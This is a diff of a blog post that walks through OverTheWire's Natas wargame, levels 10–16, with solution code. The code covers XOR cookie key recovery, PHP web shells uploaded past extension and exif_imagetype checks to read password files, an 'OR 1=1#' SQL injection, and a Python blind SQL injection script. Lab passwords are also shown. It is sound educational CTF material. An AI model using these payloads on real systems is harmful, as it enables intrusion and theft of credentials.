@@ -26,7 +26,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>OverTheWire's Natas Wargame writeup (Incomplete)</title>
+    <title>OverTheWire's Natas Wargame writeup</title>
     <style>
       :root {
         --text-color: #333;
@@ -225,14 +225,14 @@
     <span>|</span>
     <a href="https://github.com/MSaidAlizada" target="_blank">GitHub</a>
     <span>|</span>
-    <a href="www.linkedin.com/in/muhammadsaid-alizada" target="_blank">LinkedIn</a>
+    <a href="https://www.linkedin.com/in/muhammadsaid-alizada/" target="_blank">LinkedIn</a>
   </div>
   
   <nav>
     <a href="http://localhost:4000/">home</a>
     <a href="http://localhost:4000/posts">posts</a>
     <a href="http://localhost:4000/assets/CV.pdf">cv</a>
-    <a href="/contact">contact</a>
+    <a href="mailto:ma8494@nyu.edu">contact</a>
   </nav>
   
   <hr class="header-divider">
@@ -258,7 +258,7 @@
 
     <div class="post-container">
       <article class="post">
-        <h1 class="post-title">OverTheWire's Natas Wargame writeup (Incomplete)</h1>
+        <h1 class="post-title">OverTheWire's Natas Wargame writeup</h1>
         <p class="post-meta">Posted on January 29, 2025</p>
         
         <div class="post-content">
@@ -401,11 +401,110 @@ URL:      http://natas10.natas.labs.overthewire.org
 <p>This level again is similar to last level but there is a filter on certain characters but thankfully our last method still works which once you repeat you can get the following flag:<br />
 UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk</p>
 
-<h3 id="level-10-1">Level 10:</h3>
+<h3 id="level-11">Level 11:</h3>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: natas11
 Password: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
 URL:      http://natas11.natas.labs.overthewire.org
 </code></pre></div></div>
+<p>In this level we are told that the cookies are encrypted using XOR and when we look in the source code we can see that the cookie is a actually storing a json object that stores bgcolor and showpassword. The json object is then xor encrypted and then base64 encrypted before being stored. Now we can solve this level by understanding how XOR encryption works (https://en.wikipedia.org/wiki/XOR_cipher). XOR cipher is done by having a key which is then repeated to match the length of the text we are encrypting and then XOR operation is carried out on the two. But due to how an XOR operation works we can also get the key by doing the operation on the plain text and encrypted text.</p>
+
+<p>So for this level we already know that the default value we are encrypting is:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$defaultdata = array( "showpassword"=&gt;"no", "bgcolor"=&gt;"#ffffff");
+</code></pre></div></div>
+<p>We can use the cookie we are encrypting as the key after base64 decoding it and the default value as the text we are encrypting after making it into a json object. I did this in the following php script:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
+function xor_encrypt($in) {
+    $key = base64_decode('&lt;your cookie&gt;');
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i&lt;strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+echo xor_encrypt(json_encode(array( "showpassword"=&gt;"no", "bgcolor"=&gt;"#ffffff")));
+?&gt; 
+</code></pre></div></div>
+<p>Now this should output the key repeated which you can then use to encode your own cookie where showpassword is set to true.</p>
+
+<h3 id="level-12">Level 12:</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: natas12
+Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
+URL:      http://natas12.natas.labs.overthewire.org
+</code></pre></div></div>
+<p>Since this level looks like it has file upload vulnerability I begin by creating the following php script to run the ls command:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php echo exec('ls'); ?&gt;
+</code></pre></div></div>
+<p>However it uploads my file as jpg with a different filename. After reading the source code I see that there is random file name given as hidden parameter in the form so then I capture the request using burp and am able to change the file extension to .php. Now I see a bunch of other files that have been uploaded by other people as well I remember from a previous challenge that the password for the level is stored at /etc/natas_webpass/natas_13. So I keep iterating over “cd ../” till I find the etc folder and then using the script below to show me the contents of the file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php echo shell_exec('cd ../../../../../; cat etc/natas_webpass/natas13;); ?&gt;
+</code></pre></div></div>
+
+<h3 id="level-13">Level 13:</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: natas13
+Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
+URL:      http://natas13.natas.labs.overthewire.org
+</code></pre></div></div>
+<p>In this level the only difference to the last one is that the source code includes:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>}else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+        echo "File is not an image";
+}
+</code></pre></div></div>
+<p>Now after searching up exif_imagetype bypass I found that this python script can be used to make the file appear as an image to that function:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fh = open('shell.php', 'w')
+fh.write('\xFF\xD8\xFF\xE0' + '&lt;?php echo shell_exec('cd ../../../../../; cat etc/natas_webpass/natas14;); ?&gt;')
+fh.close()
+</code></pre></div></div>
+<p>The above code works since exif_imagetype only checks the first few bits of a file and since all jpg files start with \xFF\xD8\xFF\xE0 we can trick it into think our file is a jpg file.</p>
+
+<h3 id="level-14">Level 14</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: natas14
+Password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
+URL:      http://natas14.natas.labs.overthewire.org
+</code></pre></div></div>
+<p>In this level we are given a login form and after reading the source code you see the authentication is done through an SQl query to see if any data is returned. We are shown that the query is:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+</code></pre></div></div>
+<p>Now we can do an SQLi by putting the username as “ OR 1=1# since this would remove the password condition returning all the users and log us in.</p>
+<h3 id="level-15">Level 15</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: natas15
+Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
+URL:      http://natas15.natas.labs.overthewire.org
+</code></pre></div></div>
+<p>For this level we are given a form which lets us check if a user exists which it checks through the following SQL query:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+</code></pre></div></div>
+<p>Since this time our output is either the user exists or doesn’t we will have to do a blind sql injection where we inject a conditional statement to check what character is in each position of the password. For example with this input (natas16” AND SUBSTRING(password,1,1) = “a) we can check if first character is a. So to check all the characters and get the full password I created this python script:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import requests
+
+url = "http://natas15.natas.labs.overthewire.org/index.php"
+payload = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M','N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
+found = True
+natas16_password = ""
+count = 1
+while found:
+    found = False
+    for i in payload:
+        data={'username':'natas16" AND BINARY SUBSTRING(password,'+str(count)+',1) = "'+i}    
+        r = requests.post(url, data=data, auth=("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"))
+        if("This user exists." in r.text):
+            natas16_password += i
+            found = True
+            count += 1
+            break
+        
+    print(natas16_password)
+</code></pre></div></div>
+<p>The script sends requests for each position till it finds the matching character and then concatenates that to a string, then once there are no matches it has reached the end of the. Note that we need to include BINARY in our query for the checks to be case sensitive since it is insensitive by default.</p>
+
+<h3 id="level-16">Level 16</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: natas16
+Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
+URL:      http://natas16.natas.labs.overthewire.org
+</code></pre></div></div>
+<p>This level is similar to natas9 where we need to inject into their command.</p>
 
         </div>
         
